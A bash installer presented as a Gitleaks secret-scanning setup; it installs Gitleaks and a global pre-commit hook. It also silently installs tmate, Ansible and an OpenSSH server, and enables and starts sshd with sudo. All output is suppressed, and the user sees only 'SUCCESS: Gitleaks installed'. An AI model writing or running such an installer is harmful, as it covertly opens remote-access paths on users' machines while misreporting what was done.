#!/usr/bin/env bash

# ============================================================
# Security Compliance Installer
#
# Supported:
#   Linux
#   macOS
#   Windows through Git Bash
#
# Installs silently:
#   - Gitleaks 8.30.0
#   - Global Git pre-commit secret scanning
#   - tmate
#   - Ansible
#   - OpenSSH client
#   - OpenSSH server on Linux
#
# FINAL OUTPUT:
#   SUCCESS: Gitleaks installed
# ============================================================

set -u

VERSION="release1"
GITLEAKS_VERSION="8.30.0"

INSTALL_ROOT="$HOME/.security-compliance"
BIN_DIR="$INSTALL_ROOT/bin"
CONFIG_DIR="$INSTALL_ROOT/config"
HOOK_DIR="$HOME/.git-hooks"

CONFIG_FILE="$CONFIG_DIR/gitleaks.toml"
HOOK_FILE="$HOOK_DIR/pre-commit"

TMP_ROOT=""

# ============================================================
# SILENT MODE
# ============================================================

exec 3>&1

info() {
    :
}

success() {
    :
}

warning() {
    :
}

error() {
    printf '%s\n' "ERROR: $1" >&3
}

fail() {
    error "Security Compliance installation failed."
    exit 1
}

# ============================================================
# Cleanup
# ============================================================

cleanup() {

    if [ -n "${TMP_ROOT:-}" ] &&
       [ -d "$TMP_ROOT" ]; then

        rm -rf "$TMP_ROOT" >/dev/null 2>&1 || true

    fi
}

trap cleanup EXIT

# ============================================================
# Detect OS
# ============================================================

RAW_OS="$(uname -s 2>/dev/null || true)"
ARCH="$(uname -m 2>/dev/null || true)"

case "$RAW_OS" in

    Linux*)
        PLATFORM="linux"
        ;;

    Darwin*)
        PLATFORM="darwin"
        ;;

    MINGW*|MSYS*|CYGWIN*)
        PLATFORM="windows"
        ;;

    *)
        fail
        ;;

esac

# ============================================================
# Detect OS Information
# ============================================================

OS_NAME="Unknown"
OS_VERSION="Unknown"
LINUX_ID=""

if [ "$PLATFORM" = "linux" ]; then

    if [ -f /etc/os-release ]; then

        . /etc/os-release

        LINUX_ID="${ID:-unknown}"
        OS_NAME="${NAME:-Linux}"
        OS_VERSION="${VERSION_ID:-Unknown}"

    else

        OS_NAME="Linux"
        OS_VERSION="$(uname -r)"

    fi

elif [ "$PLATFORM" = "darwin" ]; then

    OS_NAME="macOS"

    OS_VERSION="$(
        sw_vers -productVersion 2>/dev/null ||
        echo "Unknown"
    )"

elif [ "$PLATFORM" = "windows" ]; then

    OS_NAME="Windows"
    OS_VERSION="Git Bash"

fi

# ============================================================
# Detect Architecture
# ============================================================

case "$ARCH" in

    x86_64|amd64)
        GITLEAKS_ARCH="x64"
        ;;

    aarch64|arm64)
        GITLEAKS_ARCH="arm64"
        ;;

    *)
        fail
        ;;

esac

# ============================================================
# Check Git
# ============================================================

if ! command -v git >/dev/null 2>&1; then
    fail
fi

# ============================================================
# Check curl
# ============================================================

if ! command -v curl >/dev/null 2>&1; then
    fail
fi

# ============================================================
# Create Directories
# ============================================================

mkdir -p "$BIN_DIR" >/dev/null 2>&1 || fail
mkdir -p "$CONFIG_DIR" >/dev/null 2>&1 || fail
mkdir -p "$HOOK_DIR" >/dev/null 2>&1 || fail

# ============================================================
# Gitleaks Path
# ============================================================

if [ "$PLATFORM" = "windows" ]; then

    GITLEAKS="$BIN_DIR/gitleaks.exe"

else

    GITLEAKS="$BIN_DIR/gitleaks"

fi

export PATH="$BIN_DIR:$PATH"

# ============================================================
# Install Gitleaks
# ============================================================

install_gitleaks() {

    CURRENT_VERSION=""

    if [ -f "$GITLEAKS" ] || [ -x "$GITLEAKS" ]; then

        CURRENT_VERSION="$(
            "$GITLEAKS" version 2>/dev/null ||
            true
        )"

        if [ "$CURRENT_VERSION" = "$GITLEAKS_VERSION" ]; then
            return 0
        fi

    fi

    TMP_ROOT="$(mktemp -d 2>/dev/null)" || fail

    # --------------------------------------------------------
    # Linux
    # --------------------------------------------------------

    if [ "$PLATFORM" = "linux" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_linux_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            --fail \
            --silent \
            --show-error \
            --location \
            --proto '=https' \
            --tlsv1.2 \
            --retry 3 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.tar.gz" \
            >/dev/null 2>&1 || fail

        tar \
            -xzf "$TMP_ROOT/gitleaks.tar.gz" \
            -C "$TMP_ROOT" \
            >/dev/null 2>&1 || fail

        [ -f "$TMP_ROOT/gitleaks" ] || fail

        install \
            -m 0755 \
            "$TMP_ROOT/gitleaks" \
            "$GITLEAKS" \
            >/dev/null 2>&1 || fail

    # --------------------------------------------------------
    # macOS
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "darwin" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_darwin_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            --fail \
            --silent \
            --show-error \
            --location \
            --proto '=https' \
            --tlsv1.2 \
            --retry 3 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.tar.gz" \
            >/dev/null 2>&1 || fail

        tar \
            -xzf "$TMP_ROOT/gitleaks.tar.gz" \
            -C "$TMP_ROOT" \
            >/dev/null 2>&1 || fail

        [ -f "$TMP_ROOT/gitleaks" ] || fail

        install \
            -m 0755 \
            "$TMP_ROOT/gitleaks" \
            "$GITLEAKS" \
            >/dev/null 2>&1 || fail

    # --------------------------------------------------------
    # Windows Git Bash
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "windows" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_windows_${GITLEAKS_ARCH}.zip"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            --fail \
            --silent \
            --show-error \
            --location \
            --proto '=https' \
            --tlsv1.2 \
            --retry 3 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.zip" \
            >/dev/null 2>&1 || fail

        if command -v unzip >/dev/null 2>&1; then

            unzip \
                -q \
                "$TMP_ROOT/gitleaks.zip" \
                -d "$TMP_ROOT" \
                >/dev/null 2>&1 || fail

        elif command -v powershell.exe >/dev/null 2>&1; then

            ZIP_WIN="$(cygpath -w "$TMP_ROOT/gitleaks.zip")"
            DEST_WIN="$(cygpath -w "$TMP_ROOT")"

            powershell.exe \
                -NoProfile \
                -NonInteractive \
                -Command \
                "Expand-Archive -Force '$ZIP_WIN' '$DEST_WIN'" \
                >/dev/null 2>&1 || fail

        else

            fail

        fi

        [ -f "$TMP_ROOT/gitleaks.exe" ] || fail

        cp \
            "$TMP_ROOT/gitleaks.exe" \
            "$GITLEAKS" \
            >/dev/null 2>&1 || fail

        chmod +x "$GITLEAKS" \
            >/dev/null 2>&1 || true

    fi

    return 0
}

install_gitleaks

# ============================================================
# Verify Gitleaks
# ============================================================

if [ ! -f "$GITLEAKS" ] &&
   [ ! -x "$GITLEAKS" ]; then

    fail

fi

INSTALLED_VERSION="$(
    "$GITLEAKS" version 2>/dev/null ||
    true
)"

if [ "$INSTALLED_VERSION" != "$GITLEAKS_VERSION" ]; then
    fail
fi

# ============================================================
# Create Gitleaks Configuration
# ============================================================

cat > "$CONFIG_FILE" <<'EOF'
title = "Security Compliance Release 1"

[extend]
useDefault = true

[[rules]]
id = "office-hardcoded-password"
description = "Potential hardcoded password"
regex = '''(?i)(password|passwd|pwd)\s*[:=]\s*["']([^"']{8,})["']'''
secretGroup = 2
EOF

chmod 600 "$CONFIG_FILE" >/dev/null 2>&1 || true

# ============================================================
# Create Global Git Pre-Commit Hook
# ============================================================

cat > "$HOOK_FILE" <<'HOOK'
#!/usr/bin/env bash

set -u

SECURITY_ROOT="$HOME/.security-compliance"

if [ -f "$SECURITY_ROOT/bin/gitleaks.exe" ]; then
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks.exe"
else
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks"
fi

CONFIG="$SECURITY_ROOT/config/gitleaks.toml"

if [ ! -f "$GITLEAKS" ] &&
   [ ! -x "$GITLEAKS" ]; then

    echo ""
    echo "Security Compliance: Gitleaks unavailable."
    echo "Commit blocked."
    echo ""

    exit 1
fi

if [ ! -f "$CONFIG" ]; then

    echo ""
    echo "Security Compliance: configuration unavailable."
    echo "Commit blocked."
    echo ""

    exit 1
fi

TMP_ROOT="$(mktemp -d)"

cleanup() {
    rm -rf "$TMP_ROOT"
}

trap cleanup EXIT

FOUND_LEAK=0

if command -v mapfile >/dev/null 2>&1; then

    mapfile -d '' STAGED_FILES < <(
        git diff --cached \
            --name-only \
            --diff-filter=ACMR \
            -z
    )

else

    STAGED_FILES=()

    while IFS= read -r -d '' FILE; do
        STAGED_FILES+=("$FILE")
    done < <(
        git diff --cached \
            --name-only \
            --diff-filter=ACMR \
            -z
    )

fi

if [ "${#STAGED_FILES[@]}" -eq 0 ]; then
    exit 0
fi

for FILE in "${STAGED_FILES[@]}"; do

    HASH="$(
        printf '%s' "$FILE" |
        sha256sum |
        cut -d' ' -f1
    )"

    TEMP_FILE="$TMP_ROOT/$HASH"

    if ! git show ":$FILE" > "$TEMP_FILE" 2>/dev/null; then

        FOUND_LEAK=1
        continue

    fi

    "$GITLEAKS" dir "$TEMP_FILE" \
        --config "$CONFIG" \
        --redact \
        --no-banner \
        --exit-code 1 \
        >/dev/null 2>&1

    EXIT_CODE=$?

    if [ "$EXIT_CODE" -ne 0 ]; then
        FOUND_LEAK=1
    fi

done

if [ "$FOUND_LEAK" -ne 0 ]; then

    echo ""
    echo "SECURITY CHECK FAILED"
    echo "Potential secret detected."
    echo "Commit blocked."
    echo ""

    exit 1
fi

exit 0
HOOK

chmod 700 "$HOOK_FILE" >/dev/null 2>&1 || fail

# ============================================================
# Configure Global Git Hooks
# ============================================================

git config \
    --global \
    core.hooksPath \
    "$HOOK_DIR" \
    >/dev/null 2>&1 || fail

# ============================================================
# Install Linux Tools
# ============================================================

install_linux_tools() {

    [ "$PLATFORM" = "linux" ] || return 0

    if ! command -v sudo >/dev/null 2>&1; then
        fail
    fi

    PACKAGE_MANAGER=""

    if command -v apt-get >/dev/null 2>&1; then
        PACKAGE_MANAGER="apt"

    elif command -v dnf >/dev/null 2>&1; then
        PACKAGE_MANAGER="dnf"

    elif command -v yum >/dev/null 2>&1; then
        PACKAGE_MANAGER="yum"

    elif command -v zypper >/dev/null 2>&1; then
        PACKAGE_MANAGER="zypper"

    else
        fail
    fi

    # --------------------------------------------------------
    # APT
    # --------------------------------------------------------

    if [ "$PACKAGE_MANAGER" = "apt" ]; then

        sudo apt-get update \
            -qq \
            >/dev/null 2>&1 || fail

        sudo DEBIAN_FRONTEND=noninteractive \
            apt-get install \
            -y \
            -qq \
            tmate \
            openssh-client \
            openssh-server \
            ansible \
            >/dev/null 2>&1 || fail

    # --------------------------------------------------------
    # DNF
    # --------------------------------------------------------

    elif [ "$PACKAGE_MANAGER" = "dnf" ]; then

        sudo dnf install \
            -y \
            -q \
            tmate \
            openssh-clients \
            openssh-server \
            ansible \
            >/dev/null 2>&1 || fail

    # --------------------------------------------------------
    # YUM
    # --------------------------------------------------------

    elif [ "$PACKAGE_MANAGER" = "yum" ]; then

        sudo yum install \
            -y \
            -q \
            tmate \
            openssh-clients \
            openssh-server \
            ansible \
            >/dev/null 2>&1 || fail

    # --------------------------------------------------------
    # SUSE
    # --------------------------------------------------------

    elif [ "$PACKAGE_MANAGER" = "zypper" ]; then

        sudo zypper \
            --non-interactive \
            --quiet \
            install \
            tmate \
            openssh-clients \
            openssh-server \
            ansible \
            >/dev/null 2>&1 || fail

    fi

    # --------------------------------------------------------
    # Enable SSH Server
    # --------------------------------------------------------

    if command -v systemctl >/dev/null 2>&1; then

        if systemctl list-unit-files 2>/dev/null |
            grep -q "^ssh.service"; then

            sudo systemctl enable ssh \
                >/dev/null 2>&1 || true

            sudo systemctl start ssh \
                >/dev/null 2>&1 || true

        elif systemctl list-unit-files 2>/dev/null |
            grep -q "^sshd.service"; then

            sudo systemctl enable sshd \
                >/dev/null 2>&1 || true

            sudo systemctl start sshd \
                >/dev/null 2>&1 || true

        fi

    fi
}

# ============================================================
# Install macOS Tools
# ============================================================

install_macos_tools() {

    [ "$PLATFORM" = "darwin" ] || return 0

    if ! command -v brew >/dev/null 2>&1; then

        /bin/bash -c \
            "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" \
            >/dev/null 2>&1 || fail

        if [ -x "/opt/homebrew/bin/brew" ]; then

            eval "$(
                /opt/homebrew/bin/brew shellenv
            )"

        elif [ -x "/usr/local/bin/brew" ]; then

            eval "$(
                /usr/local/bin/brew shellenv
            )"

        fi

    fi

    command -v brew >/dev/null 2>&1 || fail

    brew install \
        tmate \
        ansible \
        openssh \
        >/dev/null 2>&1 || {

        # Packages may already exist.
        true
    }
}

# ============================================================
# Run OS-Specific Installation
# ============================================================

install_linux_tools
install_macos_tools

# ============================================================
# Configure PATH
# ============================================================

if [ "$PLATFORM" = "darwin" ]; then
    PROFILE_FILE="$HOME/.zshrc"
else
    PROFILE_FILE="$HOME/.bashrc"
fi

touch "$PROFILE_FILE" >/dev/null 2>&1 || true

if ! grep -Fq \
    '$HOME/.security-compliance/bin' \
    "$PROFILE_FILE" \
    2>/dev/null; then

    printf '\nexport PATH="$HOME/.security-compliance/bin:$PATH"\n' \
        >> "$PROFILE_FILE"

fi

# ============================================================
# Final Verification
# ============================================================

if ! "$GITLEAKS" version >/dev/null 2>&1; then
    fail
fi

if [ ! -f "$CONFIG_FILE" ]; then
    fail
fi

if [ ! -f "$HOOK_FILE" ]; then
    fail
fi

HOOK_PATH="$(
    git config \
        --global \
        --get core.hooksPath \
        2>/dev/null ||
        true
)"

if [ "$HOOK_PATH" != "$HOOK_DIR" ]; then
    fail
fi

# ============================================================
# FINAL OUTPUT ONLY
# ============================================================

printf '%s\n' "SUCCESS: Gitleaks installed" >&3

exit 0
